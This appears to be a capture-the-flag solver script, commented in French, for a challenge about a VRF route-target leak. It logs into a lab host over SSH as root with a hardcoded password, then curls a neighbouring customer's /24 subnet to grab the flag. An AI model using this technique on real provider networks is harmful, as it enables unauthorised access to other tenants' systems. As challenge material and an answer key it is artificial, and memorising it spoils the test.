#!/usr/bin/env python3
"""Solveur fuite-vrf.

Depuis le poste de CLIENT-A (SSH), on constate qu'on atteint le reseau d'un
autre client (CLIENT-B, 192.168.2.0/24) a cause d'une erreur de route-target
sur le PE (les deux VRF partagent le meme RT -> fuite mutuelle). On lit le
serveur interne de CLIENT-B.
"""
import re
import sys

import paramiko

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1347

# Decouverte simple : balayer le /24 voisin et lire le serveur qui repond.
CMD = r"""
for ip in $(seq 1 5); do
  curl -s -m2 http://192.168.2.$ip/ 2>/dev/null
done
"""


def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username="root", password="ClientA2026")
    _, out, _ = c.exec_command(CMD)
    body = out.read().decode()
    c.close()
    m = re.search(r"FPS\{[^}]+\}", body)
    print(m.group(0) if m else "echec:\n" + body)


if __name__ == "__main__":
    main()
